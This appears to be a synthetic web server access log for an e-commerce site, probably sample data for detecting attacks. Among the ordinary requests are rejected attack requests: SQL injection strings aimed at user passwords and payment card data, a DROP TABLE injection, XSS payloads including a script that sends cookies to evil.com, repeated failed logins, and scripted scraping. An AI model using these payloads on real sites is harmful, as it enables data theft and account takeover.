192.168.1.27 - - [15/Jun/2025:00:42:59 +0000] "GET /robots.txt HTTP/1.1" 200 7432 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.17 - - [15/Jun/2025:00:33:05 +0000] "POST /about HTTP/1.1" 201 7292 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.39 - - [15/Jun/2025:00:54:49 +0000] "GET /images/banner.jpg HTTP/1.1" 200 579 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.44 - - [15/Jun/2025:00:54:14 +0000] "GET / HTTP/1.1" 404 6843 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:05:55 +0000] "POST /api/login HTTP/1.1" 401 196 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [15/Jun/2025:00:55:47 +0000] "GET /favicon.ico HTTP/1.1" 200 705 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:15:30 +0000] "POST /api/login HTTP/1.1" 401 216 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.23 - - [15/Jun/2025:00:31:31 +0000] "GET /contact HTTP/1.1" 200 5884 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.34 - - [15/Jun/2025:00:57:25 +0000] "GET /products HTTP/1.1" 200 1296 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.27 - - [15/Jun/2025:00:57:40 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 4954 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:14:32 +0000] "POST /api/login HTTP/1.1" 401 231 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [15/Jun/2025:00:29:43 +0000] "POST /checkout HTTP/1.1" 201 2276 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.25 - - [15/Jun/2025:00:58:04 +0000] "POST /api/user/profile HTTP/1.1" 200 6962 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [15/Jun/2025:00:42:21 +0000] "GET /static/css/main.css HTTP/1.1" 304 6204 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.35 - - [15/Jun/2025:00:30:38 +0000] "POST /api/products?category=clothing HTTP/1.1" 201 2244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.31 - - [15/Jun/2025:00:31:46 +0000] "GET /static/js/app.js HTTP/1.1" 200 3191 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.35 - - [15/Jun/2025:00:46:38 +0000] "GET /robots.txt HTTP/1.1" 200 4580 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.46 - - [15/Jun/2025:00:29:53 +0000] "GET /robots.txt HTTP/1.1" 200 3780 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:47 +0000] "GET /cart HTTP/1.1" 200 1559 "-" "libwww-perl/6.72"
192.168.1.34 - - [15/Jun/2025:00:54:03 +0000] "GET /favicon.ico HTTP/1.1" 304 4752 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:59 +0000] "GET /about HTTP/1.1" 200 1578 "-" "curl/8.5.0"
172.16.0.55 - - [15/Jun/2025:00:19:31 +0000] "GET /search?q=1' UNION SELECT null,table_name FROM information_schema.tables-- HTTP/1.1" 400 550 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.26 - - [15/Jun/2025:00:35:24 +0000] "GET /api/orders HTTP/1.1" 200 7067 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.25 - - [15/Jun/2025:00:47:18 +0000] "POST /contact HTTP/1.1" 200 5633 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.30 - - [15/Jun/2025:00:41:00 +0000] "POST /robots.txt HTTP/1.1" 200 6253 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:04:53 +0000] "POST /api/login HTTP/1.1" 401 231 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.48 - - [15/Jun/2025:00:31:41 +0000] "GET /checkout HTTP/1.1" 200 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.49 - - [15/Jun/2025:00:48:28 +0000] "GET /products HTTP/1.1" 200 7548 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [15/Jun/2025:00:52:16 +0000] "GET /about HTTP/1.1" 200 7105 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.15 - - [15/Jun/2025:00:49:01 +0000] "POST / HTTP/1.1" 201 998 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.28 - - [15/Jun/2025:00:47:42 +0000] "GET /cart HTTP/1.1" 200 3983 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.29 - - [15/Jun/2025:00:46:49 +0000] "GET /index.html HTTP/1.1" 304 4872 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:26:43 +0000] "GET /products?name=<img src=x onerror=alert(document.domain)> HTTP/1.1" 400 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.28 - - [15/Jun/2025:00:37:16 +0000] "POST /contact HTTP/1.1" 200 7342 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.47 - - [15/Jun/2025:00:37:25 +0000] "GET /api/orders HTTP/1.1" 200 5794 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.37 - - [15/Jun/2025:00:39:17 +0000] "GET /products HTTP/1.1" 404 3830 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.15 - - [15/Jun/2025:00:43:02 +0000] "GET /static/css/main.css HTTP/1.1" 200 7343 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.15 - - [15/Jun/2025:00:53:12 +0000] "POST /products HTTP/1.1" 200 5714 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.21 - - [15/Jun/2025:00:55:45 +0000] "GET /products HTTP/1.1" 200 411 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:28:20 +0000] "GET /api/products HTTP/1.1" 200 3401 "-" "curl/8.5.0"
10.0.0.99 - - [15/Jun/2025:00:27:33 +0000] "GET /api/comment?text=<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script> HTTP/1.1" 400 477 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.23 - - [15/Jun/2025:00:37:22 +0000] "GET /static/css/main.css HTTP/1.1" 404 3563 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.45 - - [15/Jun/2025:00:44:51 +0000] "GET /contact HTTP/1.1" 200 2857 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:21:15 +0000] "GET /api/comment?text=<script>fetch('https://evil.com/?c='+btoa(document.cookie))</script> HTTP/1.1" 400 574 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.18 - - [15/Jun/2025:00:47:54 +0000] "GET /images/banner.jpg HTTP/1.1" 200 6211 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.46 - - [15/Jun/2025:00:45:36 +0000] "GET / HTTP/1.1" 200 3448 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:43 +0000] "GET /api/products?category=electronics HTTP/1.1" 429 583 "-" "curl/8.5.0"
192.168.1.28 - - [15/Jun/2025:00:33:38 +0000] "POST /api/cart/add HTTP/1.1" 200 2919 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.13 - - [15/Jun/2025:00:46:31 +0000] "GET /checkout HTTP/1.1" 200 4116 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:13:30 +0000] "POST /api/login HTTP/1.1" 401 239 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.18 - - [15/Jun/2025:00:53:55 +0000] "GET /favicon.ico HTTP/1.1" 304 7288 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.37 - - [15/Jun/2025:00:50:55 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 2541 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.44 - - [15/Jun/2025:00:39:37 +0000] "GET /images/banner.jpg HTTP/1.1" 200 440 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.19 - - [15/Jun/2025:00:41:55 +0000] "GET /images/banner.jpg HTTP/1.1" 200 4883 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.44 - - [15/Jun/2025:00:38:18 +0000] "GET / HTTP/1.1" 200 4249 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:22:45 +0000] "GET /api/products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 400 359 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.35 - - [15/Jun/2025:00:49:10 +0000] "GET /about HTTP/1.1" 304 4682 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.25 - - [15/Jun/2025:00:30:30 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 1613 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.11 - - [15/Jun/2025:00:43:36 +0000] "GET /cart HTTP/1.1" 200 4511 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.29 - - [15/Jun/2025:00:44:39 +0000] "GET /static/css/main.css HTTP/1.1" 404 5329 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:17:02 +0000] "POST /api/login HTTP/1.1" 401 182 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.48 - - [15/Jun/2025:00:30:55 +0000] "GET / HTTP/1.1" 200 1576 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:54 +0000] "GET /api/cart/add HTTP/1.1" 200 2717 "-" "Go-http-client/1.1"
45.152.66.201 - - [15/Jun/2025:00:28:49 +0000] "GET /checkout HTTP/1.1" 429 1313 "-" "Go-http-client/1.1"
192.168.1.24 - - [15/Jun/2025:00:40:51 +0000] "POST /checkout HTTP/1.1" 201 3122 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:25:26 +0000] "GET /products?name=<img src=x onerror=alert(document.domain)> HTTP/1.1" 400 514 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.33 - - [15/Jun/2025:00:42:08 +0000] "GET /api/cart/add HTTP/1.1" 200 608 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.34 - - [15/Jun/2025:00:36:57 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 775 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.24 - - [15/Jun/2025:00:43:28 +0000] "POST /robots.txt HTTP/1.1" 200 3826 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.22 - - [15/Jun/2025:00:38:08 +0000] "GET /search?q=laptop HTTP/1.1" 200 1295 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:21 +0000] "GET /index.html HTTP/1.1" 200 3732 "-" "Wget/1.21.4"
198.51.100.42 - - [15/Jun/2025:00:01:27 +0000] "POST /api/login HTTP/1.1" 401 197 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:20:17 +0000] "GET /products?name=<img src=x onerror=alert(document.domain)> HTTP/1.1" 400 336 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [15/Jun/2025:00:49:40 +0000] "POST /api/products?category=electronics HTTP/1.1" 200 4394 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:20:08 +0000] "GET /api/search?term=1; DROP TABLE users-- HTTP/1.1" 400 506 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.21 - - [15/Jun/2025:00:36:08 +0000] "GET / HTTP/1.1" 304 2266 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.47 - - [15/Jun/2025:00:43:55 +0000] "GET /products HTTP/1.1" 304 3843 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.16 - - [15/Jun/2025:00:56:29 +0000] "POST /api/cart/add HTTP/1.1" 201 5683 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.22 - - [15/Jun/2025:00:58:14 +0000] "GET /about HTTP/1.1" 304 5980 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:18 +0000] "GET /api/orders HTTP/1.1" 200 3252 "-" "libwww-perl/6.72"
192.168.1.26 - - [15/Jun/2025:00:34:20 +0000] "GET /api/products?category=electronics HTTP/1.1" 404 3811 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:28:25 +0000] "GET /index.html HTTP/1.1" 200 3078 "-" "python-requests/2.31.0"
192.168.1.46 - - [15/Jun/2025:00:58:59 +0000] "POST / HTTP/1.1" 200 6429 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.17 - - [15/Jun/2025:00:53:00 +0000] "POST /static/js/app.js HTTP/1.1" 201 6111 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.33 - - [15/Jun/2025:00:59:12 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 6371 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [15/Jun/2025:00:50:48 +0000] "GET /robots.txt HTTP/1.1" 200 758 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:20 +0000] "GET /sitemap.xml HTTP/1.1" 200 928 "-" "Go-http-client/1.1"
192.168.1.27 - - [15/Jun/2025:00:53:59 +0000] "GET /about HTTP/1.1" 404 5819 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.19 - - [15/Jun/2025:00:44:24 +0000] "GET /about HTTP/1.1" 304 7837 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.25 - - [15/Jun/2025:00:43:39 +0000] "GET /search?q=laptop HTTP/1.1" 304 1296 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:27:16 +0000] "GET /products?name=<img src=x onerror=alert(document.domain)> HTTP/1.1" 400 300 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [15/Jun/2025:00:35:49 +0000] "POST /checkout HTTP/1.1" 200 5461 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.28 - - [15/Jun/2025:00:38:32 +0000] "GET / HTTP/1.1" 304 2120 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.24 - - [15/Jun/2025:00:41:18 +0000] "GET /static/css/main.css HTTP/1.1" 404 6039 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [15/Jun/2025:00:49:59 +0000] "GET /cart HTTP/1.1" 304 1024 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.28 - - [15/Jun/2025:00:36:27 +0000] "GET /search?q=laptop HTTP/1.1" 200 4405 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:11:35 +0000] "POST /api/login HTTP/1.1" 401 198 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:00:34 +0000] "POST /api/login HTTP/1.1" 401 201 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:07:05 +0000] "POST /api/login HTTP/1.1" 401 206 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:25:22 +0000] "GET /api/login?user=admin'-- HTTP/1.1" 400 320 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.18 - - [15/Jun/2025:00:58:50 +0000] "GET /robots.txt HTTP/1.1" 200 2421 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.44 - - [15/Jun/2025:00:44:41 +0000] "GET /static/js/app.js HTTP/1.1" 404 1326 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:28:18 +0000] "GET /search?q=laptop HTTP/1.1" 200 3436 "-" "libwww-perl/6.72"
192.168.1.24 - - [15/Jun/2025:00:51:55 +0000] "GET /favicon.ico HTTP/1.1" 404 3910 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.35 - - [15/Jun/2025:00:37:54 +0000] "POST /checkout HTTP/1.1" 200 5558 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.40 - - [15/Jun/2025:00:36:44 +0000] "GET /api/user/profile HTTP/1.1" 304 4253 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [15/Jun/2025:00:51:34 +0000] "GET /checkout HTTP/1.1" 200 6283 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.17 - - [15/Jun/2025:00:57:44 +0000] "GET /search?q=laptop HTTP/1.1" 304 5009 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.43 - - [15/Jun/2025:00:35:06 +0000] "POST /contact HTTP/1.1" 201 7113 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.45 - - [15/Jun/2025:00:51:18 +0000] "POST /api/user/profile HTTP/1.1" 201 6774 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.47 - - [15/Jun/2025:00:59:25 +0000] "GET /robots.txt HTTP/1.1" 200 6446 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:19:01 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 391 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.20 - - [15/Jun/2025:00:42:39 +0000] "POST /api/user/profile HTTP/1.1" 200 1218 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.11 - - [15/Jun/2025:00:46:11 +0000] "POST /products HTTP/1.1" 201 7556 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
